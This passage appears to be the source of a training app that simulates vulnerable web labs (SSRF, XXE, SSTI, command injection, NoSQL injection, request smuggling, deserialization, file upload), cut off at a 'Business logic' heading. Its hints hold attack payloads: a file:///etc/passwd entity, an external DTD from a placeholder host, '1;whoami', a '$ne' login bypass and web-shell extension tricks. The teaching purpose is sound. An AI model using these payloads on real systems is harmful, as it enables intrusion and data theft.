// ---------- Extra lab categories (added to round out coverage) ----------
// SSRF, XXE, SSTI, command injection, NoSQL injection, HTTP request smuggling,
// insecure deserialization, file upload, business logic, race conditions, weak crypto.
// Each handler: async (req, url, ctx) => { body, solved?, contentType? }

const FLAG = 'academy{extr4_c4t3g0ry_fl4g}';
const ADMIN_HOSTS = ['localhost', '127.0.0.1', '127.1', '2130706433', '0x7f000001', '192.168.0.12'];
const FAKE_PASSWD = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nadmin:x:1000:1000:admin:/home/admin:/bin/bash';
const FAKE_ADMIN = '<h2>Internal admin panel</h2><p>You reached an internal-only admin page via SSRF. User: administrator (active).</p>';

// in-memory stores for blind/OAST & race emulation
const oastLog = [];          // { when, host, lab }
const couponUse = new Map(); // coupon -> last redeem timestamp
const raceEmailTs = new Map();   // key -> ts
const raceResetTs = new Map();
const redeemed = new Map();  // coupon -> {ts, count}
const cmdLog = [];

function page(body, title = 'Academy') {
  return `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title>
  <style>
    *{box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
    body{margin:0;background:#f4f5f7;color:#222}
    header{background:#24292e;color:#fff;padding:10px 20px;display:flex;justify-content:space-between;align-items:center}
    header a{color:#79b8ff;text-decoration:none}
    .wrap{max-width:900px;margin:20px auto;padding:0 16px}
    .card{background:#fff;border:1px solid #e1e4e8;border-radius:6px;padding:16px;margin-bottom:16px}
    .banner{background:#fff3cd;border:1px solid #ffeeba;color:#664d03;padding:10px 14px;border-radius:4px;margin-bottom:12px;font-size:13px}
    .ok{background:#d4edda;color:#155724;border:1px solid #c3e6cb;padding:10px 14px;border-radius:4px;margin-bottom:12px}
    .err{background:#f8d7da;color:#721c24;border:1px solid #f5c6cb;padding:10px 14px;border-radius:4px;margin-bottom:12px}
    input[type=text],input[type=password],textarea,select{width:100%;padding:8px;border:1px solid #c9ccd1;border-radius:4px;margin-bottom:10px}
    button{background:#2ea44f;color:#fff;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-size:14px}
    .muted{color:#6a737d;font-size:13px}
    pre{background:#f6f8fa;border:1px solid #e1e4e8;padding:10px;border-radius:4px;overflow:auto}
    .mono{font-family:Consolas,monospace;font-size:12px}
    .row{display:flex;gap:8px;align-items:center}
    .link{color:#0366d6;text-decoration:none;margin-right:12px}
    .warn{color:#b08800;font-size:12px}
  </style></head>
  <body><header><strong>Web Attack Academy</strong><a href="/">Back to store</a></header>
  <div class="wrap">${body}</div></body></html>`;
}
const h = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
const ok = s => `<div class="ok">${s}</div>`;
const err = s => `<div class="err">${s}</div>`;

async function form(req) {
  const t = await req.text();
  const p = new URLSearchParams(t);
  const o = {};
  p.forEach((v, k) => o[k] = v);
  return o;
}
async function json(req) {
  try { return await req.json(); } catch (e) { return {}; }
}
function isInternal(hostname) {
  const hh = String(hostname || '').toLowerCase();
  return ADMIN_HOSTS.some(a => hh.includes(a));
}
function extractUrl(s) {
  const m = String(s).match(/https?:\/\/[^\s"'<>]+/);
  return m ? m[0] : '';
}
function parseXMLSystemUrls(body) {
  // collect SYSTEM "..." and external entity refs
  const out = [];
  let re = /(?:SYSTEM|PUBLIC)\s+"([^"]+)"/g, m;
  while ((m = re.exec(body))) out.push(m[1]);
  re = /%?\s*([a-zA-Z_][\w.-]*)\s+SYSTEM\s+"([^"]+)"/g;
  while ((m = re.exec(body))) out.push(m[2]);
  re = /<!DOCTYPE[^>]*\[([\s\S]*?)\]/g;
  while ((m = re.exec(body))) out.push('DOCTYPE:' + m[1].slice(0, 120));
  return out;
}
function sstiEval(expr) {
  const e = String(expr || '').trim();
  const arith = e.match(/^(\d+)\s*([*+\-/])\s*(\d+)$/);
  if (arith) {
    const a = +arith[1], b = +arith[3];
    const r = arith[2] === '*' ? a * b : arith[2] === '+' ? a + b : arith[2] === '-' ? a - b : Math.floor(a / b);
    return String(r);
  }
  if (/FLAG|flag|secret/i.test(e)) return FLAG;
  if (/OS\.environ|config|settings/i.test(e)) return 'FLAG=' + FLAG + '\nDB_PASS=****';
  if (e === '7*7') return '49';
  return '';
}
function md5Hex(input) {
  const str = unescape(encodeURIComponent(input));
  let i, j, k, aa, bb, cc, dd;
  const S = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
    5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
    4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
    6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
  const K = [0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,
    0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,
    0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,
    0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,
    0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,
    0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,
    0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,
    0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391];
  let M = new Array(16).fill(0), a0 = 0x67452301, b0 = 0xefcdab89, c0 = 0x98badcfe, d0 = 0x10325476;
  const len = str.length;
  M = new Array(Math.ceil((len + 9) / 64) * 16).fill(0);
  for (i = 0; i < len; i++) M[i >> 2] |= (str.charCodeAt(i) << ((i % 4) * 8));
  M[len >> 2] |= 0x80 << ((len % 4) * 8);
  M[(((len + 8) >> 6) << 4) + 14] = (len * 8) & 0xffffffff;
  M[(((len + 8) >> 6) << 4) + 15] = Math.floor((len * 8) / 0x100000000);
  function rotl(x, c) { return (x << c) | (x >>> (32 - c)); }
  const F = (x, y, z) => (x & y) | (~x & z);
  const G = (x, y, z) => (x & z) | (y & ~z);
  const H = (x, y, z) => x ^ y ^ z;
  const I = (x, y, z) => y ^ (x | ~z);
  let a = a0, b = b0, c = c0, d = d0;
  const g = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,
    1,6,11,0,5,10,15,4,9,14,3,8,13,2,7,12,
    5,8,11,14,1,4,7,10,13,0,3,6,9,12,15,2,
    0,7,14,5,12,3,10,1,8,15,6,13,4,11,2,9];
  for (i = 0; i < M.length; i += 16) {
    aa = a; bb = b; cc = c; dd = d;
    for (j = 0; j < 64; j++) {
      let f, gIdx;
      if (j < 16) { f = F(b, c, d); gIdx = j; }
      else if (j < 32) { f = G(b, c, d); gIdx = (5 * j + 1) % 16; }
      else if (j < 48) { f = H(b, c, d); gIdx = (3 * j + 5) % 16; }
      else { f = I(b, c, d); gIdx = (7 * j) % 16; }
      const tmp = d;
      d = c; c = b;
      b = (b + rotl((a + f + K[j] + (M[i + gIdx] >>> 0)) >>> 0, S[j])) >>> 0;
      a = tmp;
    }
    a = (a + aa) >>> 0; b = (b + bb) >>> 0; c = (c + cc) >>> 0; d = (d + dd) >>> 0;
  }
  const hex = (x) => [x, x >>> 8, x >>> 16, x >>> 24].map((b) => ('0' + (b & 0xff).toString(16)).slice(-2)).join('');
  return hex(a) + hex(b) + hex(c) + hex(d);
}

// ============================================================
//  SSRF
// ============================================================
const ssrf = {
  // basic: stockApi fetches any URL
  async basic(req, url, ctx) {
    const stockApi = url.searchParams.get('stockApi') || '';
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">Enter a full URL to fetch stock from an internal service.</p>
      <form method="get"><input type="text" name="stockApi" value="${h(stockApi)}" placeholder="http://stock.weliketoshop.net:8080/product/stock?productId=1"><button>Check</button></form></div>`;
    if (!stockApi) return { body: page(card + '<p>Enter a stockApi URL.</p>') };
    const inner = isInternal(stockApi) && /admin/i.test(stockApi)
      ? ok('Internal request reached the admin panel.') + FAKE_ADMIN
      : ok('Request sent. Stock returned: 42 units.');
    const solved = isInternal(stockApi) && /admin/i.test(stockApi);
    return { body: page(card + inner), solved };
  },

  // blacklist blocks localhost/127.0.0.1 - bypass with decimal/hex forms
  async blacklist(req, url, ctx) {
    let stockApi = url.searchParams.get('stockApi') || '';
    const blocked = /localhost|127\.0\.0\.1|127\.1|\[::1\]/i.test(stockApi);
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">Requests to <span class="mono">localhost</span> and <span class="mono">127.0.0.1</span> are blocked. Try alternate representations.</p>
      <form method="get"><input type="text" name="stockApi" value="${h(stockApi)}"><button>Check</button></form></div>`;
    if (!stockApi) return { body: page(card) };
    if (blocked) return { body: page(card + err('Blocked: localhost/127.0.0.1 are not allowed.')) };
    const reachAdmin = isInternal(stockApi) && /admin/i.test(stockApi);
    return {
      body: page(card + (reachAdmin ? ok('Internal admin reached via alternate IP form.') + FAKE_ADMIN : ok('Stock returned: 42 units.'))),
      solved: reachAdmin
    };
  },

  // allowlist: must start with http://192.168.0.12:8080 - bypass with @
  async allowlist(req, url, ctx) {
    let stockApi = url.searchParams.get('stockApi') || '';
    const allowed = stockApi.startsWith('http://192.168.0.12:8080');
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">Only <span class="mono">http://192.168.0.12:8080</span> is allowed. The backend resolves the full URL.</p>
      <form method="get"><input type="text" name="stockApi" value="${h(stockApi)}"><button>Check</button></form></div>`;
    if (!stockApi) return { body: page(card) };
    if (!allowed) return { body: page(card + err('External URLs are not allowed.')) };
    const bypassed = stockApi.includes('@') || stockApi.includes('#');
    const reachAdmin = bypassed && /admin/i.test(stockApi);
    return {
      body: page(card + (reachAdmin
        ? ok('Allowlist bypassed with a userinfo (&#64;) trick.') + FAKE_ADMIN
        : bypassed ? ok('Request accepted (resolved via userinfo).') : ok('Stock returned: 42 units.'))),
      solved: reachAdmin
    };
  },

  // blind: no reflection, check the OAST request log
  async blind(req, url, ctx) {
    if (ctx === '/log') {
      const rows = oastLog.filter(l => l.lab === 'ssrf-4').map(l => `<li><span class="mono">${l.when}</span> → ${h(l.host)}</li>`).join('');
      const solved = oastLog.some(l => l.lab === 'ssrf-4' && !isInternal(l.host));
      return { body: page(`<div class="card"><h3>Collaborator / OAST request log</h3>${rows ? '<ul>' + rows + '</ul>' : '<p class="muted">No out-of-band requests received yet.</p>'}${solved ? ok('External callback detected — the server made a request to your host.') : ''}</div>`), solved };
    }
    const stockApi = url.searchParams.get('stockApi') || '';
    const host = (() => { try { return new URL(stockApi).host; } catch (e) { return ''; } })();
    if (stockApi) oastLog.push({ when: new Date().toISOString(), host, lab: 'ssrf-4' });
    const card = `<div class="card"><h3>Check stock</h3>
      <p class="muted">The result is never returned to you (blind). Watch your external server for the callback.</p>
      <form method="get"><input type="text" name="stockApi" placeholder="http://stock.weliketoshop.net:8080/product/stock"><button>Check</button></form>
      <a class="link" href="/lab/ssrf-4/log">View request log</a></div>`;
    return { body: page(card + (stockApi ? '<p class="muted">Request sent.</p>' : '')) };
  }
};

// ============================================================
//  XXE
// ============================================================
const xxe = {
  async basic(req, url, ctx) {
    const card = `<div class="card"><h3>Product stock lookup (XML)</h3>
      <p class="muted">POST XML like <span class="mono">&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;</span></p>
      <form method="post"><textarea name="xml" rows="5" placeholder="&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;"></textarea><button>Look up</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const xml = f.xml || '';
    const urls = parseXMLSystemUrls(xml);
    const hasPasswd = /file:\/\/\/etc\/passwd/i.test(xml) || urls.some(u => /etc\/passwd/i.test(u));
    const hasSSRF = urls.some(u => isInternal(u) && /admin/i.test(u));
    const inner = hasPasswd
      ? ok('XML entity expanded to /etc/passwd:') + '<pre class="mono">' + h(FAKE_PASSWD) + '</pre>'
      : hasSSRF ? ok('External entity reached the internal admin service.') + FAKE_ADMIN
      : ok('Stock: 42 units.');
    return { body: page(card + inner), solved: hasPasswd || hasSSRF };
  },

  async svg(req, url, ctx) {
    const card = `<div class="card"><h3>Avatar upload (SVG allowed)</h3>
      <p class="muted">Upload an SVG. The server renders it but does not sanitize entities.</p>
      <form method="post" enctype="multipart/form-data"><input type="file" name="avatar"><button>Upload</button></form>
      <p class="muted">Tip: an SVG can embed a <span class="mono">&lt;!ENTITY xxe SYSTEM "file:///etc/hostname"&gt;</span></p></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const hasFile = /file:\/\/\//i.test(body);
    const hasEntity = /<!ENTITY|<!DOCTYPE/i.test(body);
    const solved = hasFile && hasEntity;
    return {
      body: page(card + (solved ? ok('Entity expanded — file contents reflected in the rendered SVG.') + '<pre class="mono">' + h('academy-hostname') + '</pre>' : ok('Avatar uploaded.'))),
      solved
    };
  },

  async blind(req, url, ctx) {
    if (ctx === '/log') {
      const rows = oastLog.filter(l => l.lab === 'xxe-3').map(l => `<li><span class="mono">${l.when}</span> → ${h(l.host)}</li>`).join('');
      const solved = oastLog.some(l => l.lab === 'xxe-3' && !isInternal(l.host));
      return { body: page(`<div class="card"><h3>OAST log</h3>${rows ? '<ul>' + rows + '</ul>' : '<p class="muted">No out-of-band fetches yet.</p>'}${solved ? ok('External DTD fetched from your host.') : ''}</div>`), solved };
    }
    const card = `<div class="card"><h3>Stock lookup (blind XXE)</h3>
      <p class="muted">Entities are parsed but nothing is reflected. Use an external DTD and watch your host.</p>
      <form method="post"><textarea name="xml" rows="5" placeholder='&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://yourhost/evil.dtd"&gt; %xxe;]&gt;&lt;stockCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/stockCheck&gt;'></textarea><button>Send</button></form>
      <a class="link" href="/lab/xxe-3/log">View OAST log</a></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const xml = f.xml || '';
    const host = (() => { try { const u = extractUrl(xml); return u ? new URL(u).host : ''; } catch (e) { return ''; } })();
    if (host && /DOCTYPE|SYSTEM/i.test(xml)) oastLog.push({ when: new Date().toISOString(), host, lab: 'xxe-3' });
    return { body: page(card + '<p class="muted">XML parsed (blind — no output). Check the OAST log.</p>') };
  },

  async ssrf(req, url, ctx) {
    const card = `<div class="card"><h3>Stock lookup (XXE → SSRF)</h3>
      <p class="muted">Point an external entity at an internal service: <span class="mono">&lt;!ENTITY xxe SYSTEM "http://localhost:8080/admin"&gt;</span></p>
      <form method="post"><textarea name="xml" rows="5"></textarea><button>Send</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const f = await form(req);
    const xml = f.xml || '';
    const urls = parseXMLSystemUrls(xml);
    const hasSSRF = urls.some(u => isInternal(u) && /admin/i.test(u));
    return {
      body: page(card + (hasSSRF ? ok('External entity expanded to the internal admin service.') + FAKE_ADMIN : ok('Stock: 42 units.'))),
      solved: hasSSRF
    };
  }
};

// ============================================================
//  SSTI (simulated minimal template engine)
// ============================================================
const ssti = {
  async basic(req, url, ctx) {
    const name = url.searchParams.get('name') || '';
    const rendered = /\{\{[^}]*\}\}/.test(name) ? sstiEval(name.replace(/^\{\{/, '').replace(/\}\}$/, '')) : '';
    const card = `<div class="card"><h3>Greetings</h3>
      <form method="get"><input type="text" name="name" value="${h(name)}" placeholder="Hello {name} — try {{7*7}}"><button>Greet</button></form></div>`;
    const inner = name
      ? `<div class="card">Hello, <b>${h(name)}</b>${rendered ? '<p class="ok">Rendered: <span class="mono">' + h(rendered) + '</span></p>' : ''}</div>`
      : '';
    const solved = rendered === '49' || rendered === FLAG;
    return { body: page(card + inner), solved };
  },

  // reads a secret in the template context
  async context(req, url, ctx) {
    const name = url.searchParams.get('name') || '';
    const rendered = /\{\{[^}]*\}\}/.test(name) ? sstiEval(name.replace(/^\{\{/, '').replace(/\}\}$/, '')) : '';
    const card = `<div class="card"><h3>Profile greeting</h3>
      <p class="muted">The template has a <span class="mono">FLAG</span> variable in scope.</p>
      <form method="get"><input type="text" name="name" value="${h(name)}"><button>Greet</button></form></div>`;
    const inner = name ? `<div class="card">Hello, <b>${h(name)}</b>${rendered ? '<p class="ok">Rendered: <span class="mono">' + h(rendered) + '</span></p>' : ''}</div>` : '';
    const solved = rendered === FLAG || /FLAG=academy/.test(rendered);
    return { body: page(card + inner), solved };
  },

  // {{ }} stripped -> use {% ... %} block syntax
  async block(req, url, ctx) {
    let name = url.searchParams.get('name') || '';
    const stripped = name.replace(/\{\{/g, '').replace(/\}\}/g, '');
    const isBlock = /\{%[^%]*%\}/.test(name);
    const expr = (name.match(/\{%\s*print\((.*?)\)\s*%\}/) || [])[1] || '';
    const rendered = isBlock && expr ? sstiEval(expr) : '';
    const card = `<div class="card"><h3>Greetings (filtered)</h3>
      <p class="muted">The filter strips <span class="mono">{{</span> and <span class="mono">}}</span>. Try the block syntax <span class="mono">{% print(7*7) %}</span>.</p>
      <form method="get"><input type="text" name="name" value="${h(name)}"><button>Greet</button></form></div>`;
    const inner = name ? `<div class="card">Hello, <b>${h(stripped)}</b>${rendered ? '<p class="ok">Rendered: <span class="mono">' + h(rendered) + '</span></p>' : ''}</div>` : '';
    const solved = rendered === '49';
    return { body: page(card + inner), solved };
  },

  // blocks digits and * -> read the FLAG variable instead
  async noDigits(req, url, ctx) {
    const name = url.searchParams.get('name') || '';
    const rendered = /\{\{[^}]*\}\}/.test(name) ? sstiEval(name.replace(/^\{\{/, '').replace(/\}\}$/, '')) : '';
    const card = `<div class="card"><h3>Greetings (digits and * blocked)</h3>
      <p class="muted">Arithmetic like <span class="mono">7*7</span> is blocked, but you can print variables.</p>
      <form method="get"><input type="text" name="name" value="${h(name)}"><button>Greet</button></form></div>`;
    const inner = name ? `<div class="card">Hello, <b>${h(name)}</b>${rendered ? '<p class="ok">Rendered: <span class="mono">' + h(rendered) + '</span></p>' : ''}</div>` : '';
    const solved = rendered === FLAG || /FLAG=academy/.test(rendered);
    return { body: page(card + inner), solved };
  }
};

// ============================================================
//  Command injection
// ============================================================
const cmdi = {
  // reflected: output shown
  async reflected(req, url, ctx) {
    let storeId = url.searchParams.get('storeId') || '2';
    let productId = url.searchParams.get('productId') || '1';
    const inject = /[;&|`$]/.test(storeId) && /\b(whoami|id|ls|cat)\b/i.test(storeId);
    const card = `<div class="card"><h3>Product stock</h3>
      <form method="get"><div class="row"><input type="text" name="productId" value="${h(productId)}"><input type="text" name="storeId" value="${h(storeId)}" placeholder="storeId"><button>Check</button></div></form></div>`;
    if (!url.searchParams.get('storeId')) return { body: page(card + '<p class="muted">Appends your input to a shell command. Try <span class="mono">1;whoami</span></p>') };
    const output = inject ? 'uid=0(root) gid=0(root) groups=0(root)' : '';
    return {
      body: page(card + (inject ? ok('Command executed:') + '<pre class="mono">' + h(output) + '</pre>' : ok('Stock: 42 units.'))),
      solved: inject
    };
  },

  // blind: no output, check the command log
  async blind(req, url, ctx) {
    if (ctx === '/log') {
      const rows = cmdLog.filter(l => l.lab === 'cmdi-2').map(l => `<li><span class="mono">${l.when}</span> → ${h(l.cmd)}</li>`).join('');
      const solved = cmdLog.some(l => l.lab === 'cmdi-2' && /\b(whoami|id|cat)\b/i.test(l.cmd));
      return { body: page(`<div class="card"><h3>Command execution log</h3>${rows ? '<ul>' + rows + '</ul>' : '<p class="muted">No commands executed yet.</p>'}${solved ? ok('Your command ran on the server.') : ''}</div>`), solved };
    }
    let storeId = url.searchParams.get('storeId') || '2';
    const card = `<div class="card"><h3>Product stock</h3>
      <p class="muted">Output is never returned to you. Inject and watch the log.</p>
      <form method="get"><input type="text" name="storeId" value="${h(storeId)}"><button>Check</button></form>
      <a class="link" href="/lab/cmdi-2/log">View command log</a></div>`;
    if (!url.searchParams.get('storeId')) return { body: page(card) };
    const inject = /[;&|`$]/.test(storeId) && /\b(whoami|id|ls|cat|pwd)\b/i.test(storeId);
    if (inject) cmdLog.push({ when: new Date().toISOString(), cmd: storeId, lab: 'cmdi-2' });
    return { body: page(card + '<p class="muted">Request processed.</p>') };
  },

  // blocks & ; | -> newline %0a bypass
  async newline(req, url, ctx) {
    let storeId = url.searchParams.get('storeId') || '2';
    const decoded = decodeURIComponent(storeId);
    const blocked = /[;&|`$]/.test(storeId);
    const bypass = /[\r\n]/.test(decoded) && /\b(whoami|id|ls|cat)\b/i.test(decoded);
    const card = `<div class="card"><h3>Product stock (filtered)</h3>
      <p class="muted"><span class="mono">&amp; ; |</span> are filtered. Some filters forget the newline.</p>
      <form method="get"><input type="text" name="storeId" value="${h(storeId)}"><button>Check</button></form></div>`;
    if (!url.searchParams.get('storeId')) return { body: page(card) };
    if (blocked && !bypass) return { body: page(card + err('Illegal characters detected.')) };
    return {
      body: page(card + (bypass ? ok('Command executed via newline injection:') + '<pre class="mono">uid=0(root)</pre>' : ok('Stock: 42 units.'))),
      solved: bypass
    };
  }
};

// ============================================================
//  NoSQL injection
// ============================================================
const nosql = {
  // login bypass with $ne
  async login(req, url, ctx) {
    const card = `<div class="card"><h3>Login (NoSQL)</h3>
      <p class="muted">POST JSON. The query looks like <span class="mono">users.findOne({username, password})</span></p>
      <form method="post"><textarea name="body" rows="6">{"username":"administrator","password":{"$ne":""}}</textarea><button>Login</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const j = await json(req);
    const isOp = j && typeof j === 'object' && j.password && typeof j.password === 'object' && ('$ne' in j.password);
    const solved = isOp && (j.username === 'administrator' || j.username === 'carlos');
    return {
      body: page(card + (solved ? ok('Logged in as ' + h(j.username) + ' — password operator bypassed the check.') : err('Invalid username or password.'))),
      solved
    };
  },

  // $regex in a query param
  async regex(req, url, ctx) {
    const params = Object.fromEntries(url.searchParams);
    const opKey = Object.keys(params).find(k => /\[\$regex\]$/.test(k));
    const username = params.username || '';
    const opValue = opKey ? params[opKey] : '';
    const hasOp = Boolean(opKey);
    const card = `<div class="card"><h3>Account lookup (NoSQL)</h3>
      <p class="muted">Try operator injection: <span class="mono">username[$regex]=^admin</span></p>
      <form method="get"><input type="text" name="username" value="${h(username)}"><button>Search</button></form></div>`;
    if (!username && !opValue) return { body: page(card) };
    const match = hasOp && new RegExp(opValue).test('administrator');
    return {
      body: page(card + (match ? ok('Match found: administrator (role: admin)') : ok('No account found.'))),
      solved: match
    };
  },

  // operator injection in a reset-password flow
  async operator(req, url, ctx) {
    const card = `<div class="card"><h3>Password reset (NoSQL)</h3>
      <p class="muted">POST JSON: <span class="mono">{"username":{"$regex":"^adm"}}</span></p>
      <form method="post"><textarea name="body" rows="6">{"username":"carlos"}</textarea><button>Reset</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const j = await json(req);
    const hasOp = j && j.username && typeof j.username === 'object' && ('$regex' in j.username);
    const solved = hasOp && new RegExp(String(j.username.$regex)).test('administrator');
    return {
      body: page(card + (solved ? ok('Reset email dispatched to administrator — operator injection matched an account you should not reach.') : err('User not found.'))),
      solved
    };
  }
};

// ============================================================
//  HTTP request smuggling (simulated header/body inspection)
//  A real proxy would front this; we emulate by inspecting the raw
//  request framing the client sent.
// ============================================================
const smug = {
  // CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding
  async clte(req, url, ctx) {
    const body = await req.text();
    const te = req.headers.get('transfer-encoding') || '';
    const cl = req.headers.get('content-length') || '';
    const hasSmuggled = /(?:GET|POST)\s+\/lab\/smug-1\/admin/i.test(body);
    const hasBoth = te !== '' && cl !== '';
    const card = `<div class="card"><h3>CL.TE request smuggling</h3>
      <p class="muted">Send a request where Content-Length and Transfer-Encoding disagree, smuggling a <span class="mono">GET /admin</span> into the next request.</p>
      <p class="warn">Simulated: the server inspects your framing (CL + TE headers and body).</p></div>`;
    const solved = hasBoth && hasSmuggled;
    return {
      body: page(card + (solved ? ok('Smuggled request captured — you reached /admin as a different user.') + FAKE_ADMIN : ok('Request processed normally.'))),
      solved
    };
  },

  // TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length
  async tecl(req, url, ctx) {
    const body = await req.text();
    const te = req.headers.get('transfer-encoding') || '';
    const hasSmuggled = /(?:GET|POST)\s+\/lab\/smug-2\/admin/i.test(body);
    const chunked = /chunked/i.test(te);
    const card = `<div class="card"><h3>TE.CL request smuggling</h3>
      <p class="muted">The front-end prefers Transfer-Encoding, the back-end prefers Content-Length. Send a mismatched chunked body smuggling a <span class="mono">GET /admin</span>.</p>
      <p class="warn">Simulated: framing headers are inspected.</p></div>`;
    const solved = chunked && hasSmuggled;
    return {
      body: page(card + (solved ? ok('Smuggled request captured.') + FAKE_ADMIN : ok('Request processed normally.'))),
      solved
    };
  },

  // TE.TE: obfuscate the TE header so only one server notices it
  async tete(req, url, ctx) {
    const body = await req.text();
    const te = req.headers.get('transfer-encoding') || '';
    const obfuscated = /chunked/.test(te) && te.trim().toLowerCase() !== 'chunked';
    const hasSmuggled = /(?:GET|POST)\s+\/lab\/smug-3\/admin/i.test(body);
    const card = `<div class="card"><h3>TE.TE obfuscation</h3>
      <p class="muted">Obfuscate the Transfer-Encoding header (e.g. trailing space, <span class="mono">xchunked</span>) so one server drops it and the other keeps it.</p>
      <p class="warn">Simulated: a TE header value that is not exactly "chunked" plus a smuggled request is detected.</p></div>`;
    const solved = obfuscated && hasSmuggled;
    return {
      body: page(card + (solved ? ok('Obfuscated TE header split the servers.') + FAKE_ADMIN : ok('Request processed normally.'))),
      solved
    };
  }
};

// ============================================================
//  Insecure deserialization
// ============================================================
const deser = {
  // tamper base64 php-serialized object
  async role(req, url, ctx) {
    const raw = (req.headers.get('cookie') || '').match(/session=([^;]+)/);
    let decoded = '';
    if (raw) { try { decoded = Buffer.from(decodeURIComponent(raw[1]), 'base64').toString('utf8'); } catch (e) {} }
    const tampered = /isAdmin"?;?b:1|"isAdmin"\s*:\s*true/i.test(decoded);
    const card = `<div class="card"><h3>Profile</h3>
      <p class="muted">Your session cookie is a base64-encoded PHP serialized object: <span class="mono">O:4:"User":2:{s:2:"id";i:1;s:7:"isAdmin";b:0;}</span></p>
      <p class="muted">Decode, set <span class="mono">isAdmin</span> to <span class="mono">true</span>, re-encode, and reload.</p></div>`;
    const admin = tampered ? ok('Welcome, administrator. Object tampering succeeded.') : ok('Welcome, regular user.');
    return { body: page(card + admin), solved: tampered };
  },

  // PHP object injection / magic method (gadget reads a flag)
  async gadget(req, url, ctx) {
    const raw = (req.headers.get('cookie') || '').match(/pref=([^;]+)/);
    let decoded = '';
    if (raw) { try { decoded = Buffer.from(decodeURIComponent(raw[1]), 'base64').toString('utf8'); } catch (e) {} }
    const gadget = /O:\d+:".*?":\d+:\{.*?__destruct|filename.*?flag|"command"\s*:\s*"cat/i.test(decoded);
    const card = `<div class="card"><h3>Preferences</h3>
      <p class="muted">The <span class="mono">pref</span> cookie is a serialized object with a magic method that runs on destruction. Make it read <span class="mono">/flag</span>.</p></div>`;
    return {
      body: page(card + (gadget ? ok('Gadget chain executed:') + '<pre class="mono">' + h(FLAG) + '</pre>' : ok('Preferences loaded.'))),
      solved: gadget
    };
  }
};

// ============================================================
//  File upload
// ============================================================
const upload = {
  // no restrictions
  async none(req, url, ctx) {
    const card = `<div class="card"><h3>Avatar upload</h3><form method="post" enctype="multipart/form-data"><input type="file" name="file"><button>Upload</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const fn = (body.match(/filename="([^"]+)"/) || [])[1] || '';
    const solved = /\.php$/i.test(fn);
    return {
      body: page(card + (solved ? ok('Web shell uploaded (' + h(fn) + '). No restrictions in place.') : ok('Avatar uploaded.') + (fn ? ' (' + h(fn) + ')' : ''))),
      solved
    };
  },

  // only content-type checked (client-supplied)
  async contentType(req, url, ctx) {
    const ct = req.headers.get('content-type') || '';
    const card = `<div class="card"><h3>Avatar upload</h3>
      <p class="muted">The server only trusts the client-supplied Content-Type. Send <span class="mono">.php</span> with <span class="mono">image/png</span>.</p>
      <form method="post" enctype="multipart/form-data"><input type="file" name="file"><button>Upload</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const fn = (body.match(/filename="([^"]+)"/) || [])[1] || '';
    const solved = /\.php$/i.test(fn) && /image\/(png|jpeg|gif)/i.test(ct);
    return {
      body: page(card + (solved ? ok('Bypassed: .php accepted because Content-Type claimed image/png.') : ok('Avatar uploaded.'))),
      solved
    };
  },

  // extension blacklist bypass
  async ext(req, url, ctx) {
    const card = `<div class="card"><h3>Avatar upload</h3>
      <p class="muted"><span class="mono">.php</span> is blocked. Try <span class="mono">.php5</span>, <span class="mono">.phtml</span>, <span class="mono">.pHp</span>, or <span class="mono">.phar</span>.</p>
      <form method="post" enctype="multipart/form-data"><input type="file" name="file"><button>Upload</button></form></div>`;
    if (req.method !== 'POST') return { body: page(card) };
    const body = await req.text();
    const fn = (body.match(/filename="([^"]+)"/) || [])[1] || '';
    const blocked = /\.php$/i.test(fn);
    const solved = !blocked && /\.(php5|phtml|phar|pht|php\.|pHp)$/i.test(fn);
    return {
      body: page(card + (blocked ? err('.php extensions are not allowed.') : solved ? ok('Web shell uploaded (' + h(fn) + ') — extension bypassed the blacklist.') : ok('Avatar uploaded.'))),
      solved
    };
  }
};

// ============================================================
//  Business logic
